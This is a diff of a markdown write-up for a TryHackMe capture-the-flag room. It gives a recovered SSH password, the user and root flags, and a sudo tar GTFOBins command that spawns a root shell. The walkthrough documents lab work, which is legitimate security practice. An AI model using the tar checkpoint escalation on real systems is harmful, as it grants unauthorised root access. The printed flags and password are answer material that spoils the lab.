@@ -46,8 +46,22 @@ SSH
 RedDr4gonSynd1cat3  
 ```
 
-6. user.txt  
-THM{CR1M3_SyNd1C4T3}  
+## 6. user.txt  
+<p align="center">
+  <img width="1057" height="346" alt="image" src="https://github.com/user-attachments/assets/743b5da8-0bfc-4d95-bd17-1b38c6a9364b" />
+</p>
 
-7. root.txt  
+```
+THM{CR1M3_SyNd1C4T3}  
+```
+## 7. After That we used `sudo l` command and we can escalate using `/bin/tar` we used gftobins for these and found out the below command !
+<p align="center">
+  <img width="1361" height="716" alt="image" src="https://github.com/user-attachments/assets/95479a54-22a5-43c4-8389-fdf6a82a2bba" />
+</p>
+
+```
+sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+8. root.txt  
 THM{80UN7Y_h4cK3r}  
